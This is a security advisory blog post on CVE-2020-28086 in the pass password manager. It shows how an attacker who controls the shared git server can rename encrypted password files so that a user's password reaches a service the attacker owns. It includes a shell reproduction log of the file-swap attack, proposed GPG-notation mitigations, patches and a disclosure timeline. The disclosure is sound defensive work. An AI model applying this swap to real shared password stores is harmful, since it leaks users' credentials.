---
layout: post
title: "CVE-2020-28086 information leakage through third party service in pass"
author: capitol
category: security
---
![pass-passwordstore](/images/pass-passwordstore.png)

[`pass`](https://www.passwordstore.org/) is a password manager that encrypts your or your
team's passwords with GPG and those can be stored in a Git repository.

Each password is encrypted in its own file, often named after the service and username.
For example the password for the user `richard` on the service Spotify might be named
`spotify/richard.gpg`.

## Trust Boundaries

It's possible to configure your usage of `pass` in many ways, but if you are using it in a team then
this is a common setup:

Each member has a local machine with a GPG configuration that trusts all other members of the team.

The password store is in Git, and there is a central server to which all team members push and pull.

Here we have three zones:

 * Your own machine
 * The central server
 * The other team members

Any operator in one of the zones shouldn't be able to cross a zone barrier and gain
information or resources from another zone.

## The Attack

If an attacker controls the central Git server or one of the other members' machines, and
also controls one of the services already in the password store they can do the following:

Rename one of the password files in the Git repository to something else.

`pass` doesn't correctly verify that the content of file matches the filename, so a user
might be tricked to decrypting the wrong password and send that to a service that the
attacker controls.

## Example

Given this setup:
 * A user Bob with a local installation of `pass`
 * A git server where the passwords are stored
 * One password to `bob@server1.example.com`
 * One password to `bob@server2.example.com`
 * An attacker called Mallory

If Mallory takes control over the central Git server and `server2.example.com` then he could
rename the file named `bob@server1.example.com.gpg` to `bob@server2.example.com` and commit it.

The next time that Bob then does a git pull and accesses `server2.example.com` his password to
`server1.example.com` will be exposed.

## Possible Mitigations

GPG supports storing the filename in the encryption packet. This can be set with the
`--set-filename` flag when storing a password and needs to be verified by the `pass` software before
decryption happens.

But the filename field in GPG have a couple of problems. It's limited to 255 bytes and the
specification doesn't specify what encoding that should be used. This might make it vulnerable
to further attacks due to encoding confusion.

Another solution would be to use a [signature notation](https://docs.sequoia-pgp.org/sequoia_openpgp/packet/signature/subpacket/struct.NotationData.html)
packet in GPG. It has a length of up to 64 KB. It can also be set on the `gpg` command line:

```
echo 1 |
    gpg -se --sig-notation \!filename@pass=/path/to/file.gpg -r alexander.kjall@gmail.com |
    gpg -d --verify-options show-notations --known-notation \!filename@pass
```

### Patches

A crude attempt at writing a patch for this vulnerability is in these two patches,
[adding signature]({% link /assets/0001-Sign-and-anotate-commits-with-a-filename-passwordsto.patch %})
and [verify signature]({% link /assets/0002-When-decrypting-a-password-file-first-verify-that-th.patch %}).

The patches tries to mitigate the vulnerability by applying a signature notation, but they don't
include any migration strategy for existing password stores.

## Reproduction Steps

Here is a log of the steps to reproduce the vulnerability:

```
capitol@tool:/tmp$ PASSWORD_STORE_DIR=/tmp/store1 pass init 0x1D108E6C07CBC406
Password store initialized for 0x1D108E6C07CBC406
capitol@tool:/tmp$ cd store1/
capitol@tool:/tmp/store1$ git init
Initialized empty Git repository in /tmp/store1/.git/
capitol@tool:/tmp/store1$ cd ..
capitol@tool:/tmp$ PASSWORD_STORE_DIR=/tmp/store1 pass generate bob@server1.example.com
[master (root-commit) 208e574] Add generated password for bob@server1.example.com.
 1 file changed, 1 insertion(+)
 create mode 100644 bob@server1.example.com.gpg
The generated password for bob@server1.example.com is:
7A\ZOg(|`L.G0{Dce^a~SPiC~
capitol@tool:/tmp$ PASSWORD_STORE_DIR=/tmp/store1 pass generate bob@server2.example.com
[master 4e43e37] Add generated password for bob@server2.example.com.
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 bob@server2.example.com.gpg
The generated password for bob@server2.example.com is:
"}zC}4d[wD%N$<7D@WO@2QA-f
capitol@tool:/tmp$ cd store1/
capitol@tool:/tmp/store1$ git add .gpg-id
capitol@tool:/tmp/store1$ git commit -m ".gpg-id"
[master 29e4c37] .gpg-id
 1 file changed, 1 insertion(+)
 create mode 100644 .gpg-id
capitol@tool:/tmp/store1$ cd /tmp/server/
capitol@tool:/tmp/server$ git init --bare
Initialized empty Git repository in /tmp/server/
capitol@tool:/tmp/server$ cd /tmp/store1/
capitol@tool:/tmp/store1$ git push --set-upstream /tmp/server/ master
Enumerating objects: 9, done.
Counting objects: 100% (9/9), done.
Delta compression using up to 4 threads
Compressing objects: 100% (8/8), done.
Writing objects: 100% (9/9), 1.56 KiB | 798.00 KiB/s, done.
Total 9 (delta 2), reused 0 (delta 0)
To /tmp/server/
 * [new branch]      master -> master
Branch 'master' set up to track remote branch 'master' from '/tmp/server/'.
capitol@tool:/tmp/store1$ cd ..
capitol@tool:/tmp$ git clone /tmp/server/ store2
Cloning into 'store2'...
done.
capitol@tool:/tmp$ cd store2/
capitol@tool:/tmp/store2$ cp bob@server1.example.com.gpg bob@server2.example.com.gpg
capitol@tool:/tmp/store2$ git add .
capitol@tool:/tmp/store2$ git commit -m "this is the attack"
[master d239dd5] this is the attack
 1 file changed, 0 insertions(+), 0 deletions(-)
capitol@tool:/tmp/store2$ git push
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (2/2), 406 bytes | 406.00 KiB/s, done.
Total 2 (delta 1), reused 0 (delta 0)
To /tmp/server/
   29e4c37..d239dd5  master -> master
capitol@tool:/tmp/store2$ cd /tmp/store1/
capitol@tool:/tmp/store1$ git pull
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 2 (delta 1), reused 0 (delta 0)
Unpacking objects: 100% (2/2), 386 bytes | 386.00 KiB/s, done.
From /tmp/server
 * branch            master     -> FETCH_HEAD
Updating 29e4c37..d239dd5
Fast-forward
 bob@server2.example.com.gpg | Bin 173 -> 173 bytes
 1 file changed, 0 insertions(+), 0 deletions(-)
capitol@tool:/tmp/store1$ PASSWORD_STORE_DIR=/tmp/store1 pass show bob@server2.example.com
7A\ZOg(|`L.G0{Dce^a~SPiC~
```

The password that is shown on the last line is the password associated with `bob@server1.example.com`.

## Timeline

* 2020-10-22 Email sent to main developer of pass
* 2020-10-24 CVE requested
* 2020-10-24 Email sent to main developer of [QtPass](https://qtpass.org/)
* 2020-10-24 Email sent to main developer of [gopass](https://www.gopass.pw/), the attack is outside of
  `gopass` stated security policy.
* 2020-10-24 Email sent to main developer of [upass](https://github.com/Kwpolska/upass), upass
  calls out to pass in a subshell and is therefore not directly affected.
* 2020-10-24 Email sent to main developer of [pass-winmenu](https://github.com/geluk/pass-winmenu)
* 2020-11-13 Email with first draft of a patch sent
* 2020-12-07 CVE number assigned
